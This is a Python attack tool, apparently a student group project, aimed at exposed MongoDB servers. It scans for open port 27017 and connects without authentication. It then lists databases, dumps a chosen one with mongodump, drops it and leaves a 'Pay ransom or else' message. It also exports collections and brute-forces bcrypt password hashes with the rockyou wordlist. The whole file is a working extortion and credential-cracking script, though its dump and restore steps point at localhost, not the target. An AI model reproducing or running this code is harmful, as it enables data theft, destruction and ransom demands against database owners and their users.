#!/usr/bin/env python

import threading
import bcrypt
import sys
import os
import pymongo
from pymongo import MongoClient
import subprocess
import nmap
import re



def motd():
    print("""
                             ,,,,,,,,,,,,,,,,,,,,,,,,,,.                            
                        .,,,,,,,,,,,,,,,,,,.',,,,,,,,,,,,,,,                        
                     ,,,,,,,,,      .:lllllc,         ',,,,,,,,.                    
                  ,,,,,,,.        .clllllllllc'            ,,,,,,,.                 
               .,,,,,,           :lllllllllllllc.             ',,,,,,               
             .,,,,,''...       .cllllllllllllllllc           ...',,,,,,             
            ,,,,,    ....     ;llllllllllllllllllll.       '...    ',,,,'           
          ,,,,,.      ....'  ;llllllllllllllllllllll;    .....       ',,,,          
         ,,,,'          ....:llllllllllllllllllllllll;  ....          .,,,,.        
        ,,,,.            ....;llllllllllllllllllllllll,...              ,,,,'       
      .,,,,               ....'cllllllllllllllllllllc'...                ',,,'      
      ,,,,                l:....,llllllllllllllllll,.....                 ',,,.     
     ,,,,.               ;lll;....:llllllllllllll;....;ll                  ,,,,.    
    .,,,.                lllllc'...'cllllllllllc'...,llll,                  ,,,,    
    ,,,,                .lllllll:....,lllllllc,...'cllllll                  .,,,.   
   .,,,.                :lllllllll,....:llll;....:llllllll.                  ,,,,   
   .,,,.                cllllllllllc'...'c:'...,llllllllll'                  ,,,,.  
   ,,,,                 lllllllllllll:.......'clllllllllll,                  ',,,'  
   ,,,,                 clllllllllllllc.....'lllllllllllll'                  .,,,'  
   ,,,,                 :llllllllllll:.......'clllllllllll.                  ',,,'  
   .,,,.                'llllllllllc'...'c;....;llllllllll                   ,,,,.  
   .,,,'                 lllllllll,...':llll,....:lllllllc                   ,,,,   
    ,,,,                 'llllll:....;lllllllc....,clllll.                  .,,,.   
    .,,,'                 clllc'...,cllllllllll;....;lllc                   ,,,,    
     ',,,.                 ll,....cllllllllllllll,....cl                   ,,,,.    
      ,,,,                 ;....;lllllllllllllllll:....'.                 ,,,,.     
       ,,,,.             .....,lllllllllllllllllllll;.....               ',,,.      
        ,,,,.          .....  'lllllllllllllllllllllc  .....            ,,,,.       
         ,,,,,        ....      lllllllllllllllllll.     .....        .,,,,.        
          ',,,,.    .....        .lllllllllllllll:        .....      ,,,,,          
            ,,,,,......            .lllllllllll:            .....  ,,,,,.           
             .,,,,...                .lllllll'                ...',,,,'             
                ,,,,''.                 lll,                  ..',,,.               
                  ',,,,,,'              .ll               .,,,,,,,                  
                     ',,,,,,,,.          lc           ,,,,,,,,,                     
                         ,,,,,,,,,,,,,,,;ll,,,,,,,,,,,,,,,,.                        
                             .,,,,,,,,,,,,,,,,,,,,,,,,,                             
                                       ..,,'.        
                                    Group Name                          
                                   SHAIMMA SALIC
    LEADER: TAN, Richmnond
    MEMBERS:CALUGTONG, Darylle
            GUTIERREZ, Mica
            MADRIÑAN. Raico
            SALIC, Shaimma
            VALLADOLID, Trisha
             
    """)



# Configuration
PORT = 27017
BACKUP_DIR = '/home/dax21/Desktop/backup'  # Directory where backups will be stored
WORD_LIST = 'rockyou.txt'

# Initialize counters for passwords
c = 0
cracked_count = 0
failed_count = 0

# Read the rockyou.txt file once
with open(WORD_LIST, 'r', errors='ignore') as file:
    password_lines = file.readlines()

# Bcrypt Brute-Force Function
def brute(passwdstr, hashed, output_file, username, cracked_event):
    global c, cracked_count, failed_count
    passwd = passwdstr.encode('UTF-8')
    if bcrypt.checkpw(passwd, hashed):
        cracked_event.set()
        cracked_count += 1
        output_file.write(f"Username: {username}, Password: {passwdstr}\n")



def start_brute_force(hashed, output_file, username):
    global cracked_count, failed_count, c
    cracked_event = threading.Event()
    threads = []
    for line in password_lines:
        if cracked_event.is_set():
            break
        thread = threading.Thread(target=brute, args=(line.strip(), hashed, output_file, username, cracked_event))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    if not cracked_event.is_set():
        failed_count += 1

# MongoDB Operations
def check_port_open(target, port):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, ports=str(port), arguments='-Pn')
    if target in nm.all_hosts():
        port_state = nm[target]['tcp'][port]['state']
        print(f"Nmap scan report for {target}")
        print(f"Host is {'up' if port_state == 'open' else 'down'} ({nm[target].hostname()} latency).")
        print("\nPORT          STATE      SERVICE")
        print(f"{port}/tcp     {port_state}     mongodb\n")
        return port_state == 'open'
    else:
        return False

def list_databases(client):
    print("Database/s Found:")
    print("||------------------------------------||")
    databases = client.list_database_names()
    for db in databases:
        print(db)
    print("||------------------------------------||")

def exfiltrate(client, db_name):
    print(f"Exfiltrating database {db_name}...")
    db = client[db_name]
    collections = db.list_collection_names()
    backup_path = os.path.join(BACKUP_DIR, db_name)
    os.makedirs(backup_path, exist_ok=True)
    subprocess.run(['mongodump', '--host', '127.0.0.1', '--port', str(PORT), '--db', db_name, '--out', backup_path])
    client.drop_database(db_name)
    db = client[db_name]
    db.message.insert_one({"message": "Your data has been exfiltrated. Pay ransom or else"})

def restore(client, db_name):
    print(f"Restoring database {db_name}...")
    backup_path = os.path.join(BACKUP_DIR, db_name)
    subprocess.run(['mongorestore', '--host', '127.0.0.1', '--port', str(PORT), '--nsInclude', f'{db_name}.*', backup_path])
    db = client[db_name]
    db.message.delete_many({})

def enumerate_database(client, db_name):
    print(f"Enumerating database: {db_name}")
    output_dir = f"{db_name}_output"
    os.makedirs(output_dir, exist_ok=True)
    db = client[db_name]
    collections = db.list_collection_names()
    for collection in collections:
        print(f"Enumerating collection: {collection}")
        documents = db[collection].find()
        with open(f"{output_dir}/{collection}.txt", "w") as file:
            for doc in documents:
                file.write(f"{doc}\n")
    print(f"Enumeration complete. Output stored in {output_dir} folder.")
    search_for_password_fields(db_name, output_dir)

def search_for_password_fields(db_name, output_dir):
    global cracked_count, failed_count, c
    print(f"Searching for password fields in database: {db_name}")
    db = MongoClient(f"mongodb://127.0.0.1:{PORT}")[db_name]
    collections = db.list_collection_names()
    cracked_passwords_file = os.path.join(output_dir, 'cracked_passwords.txt')
    with open(cracked_passwords_file, 'w') as output_file:
        hash_count = 0
        for collection in collections:
            coll = db[collection]
            documents = coll.find()
            for doc in documents:
                for key in doc.keys():
                    if 'password' in key.lower() or 'passwd' in key.lower():
                        password_field = doc[key]
                        if isinstance(password_field, str) and re.match(r'^\$2[ayb]\$[0-9]{2}\$[./A-Za-z0-9]{22,}$', password_field):
                            hash_count += 1
                            print("bcrypt hash password detected, proceed with cracking? (yes/no)")
                            choice = input().strip().lower()
                            if choice == 'yes':
                                hashed = password_field.encode('UTF-8')
                                username = doc.get('username', 'N/A')
                                print("Cracking passwords, please wait...")
                                start_brute_force(hashed, output_file, username)
                            else:
                                output_file.write(f"Username: {doc.get('username', 'N/A')}, Password: {password_field} (not cracked)\n")
        print(f"Total hashes identified: {hash_count}")
        print(f"Total hashes cracked: {cracked_count}")
        print(f"Total hashes failed to crack: {failed_count}")

def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py <ip>")
        sys.exit(1)

    ip = sys.argv[1]

    if not check_port_open(ip, PORT):
        print(f"Port {PORT} on {ip} is not open or reachable.")
        sys.exit(1)
    motd()
    client = MongoClient(f"mongodb://{ip}:{PORT}")

    while True:

        print("1. Enumerate all databases")
        print("2. Exfiltrate database")
        print("3. Restore database")
        print("4. Enumerate database")
        print("5. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            list_databases(client)
        elif choice == '2':
            db_name = input("Enter database name: ")
            exfiltrate(client, db_name)
        elif choice == '3':
            db_name = input("Enter database name: ")
            restore(client, db_name)
        elif choice == '4':
            db_name = input("Enter database name to enumerate: ")
            enumerate_database(client, db_name)
        elif choice == '5':
            break
        else:
            print("Invalid choice")

if __name__ == "__main__":
    main()
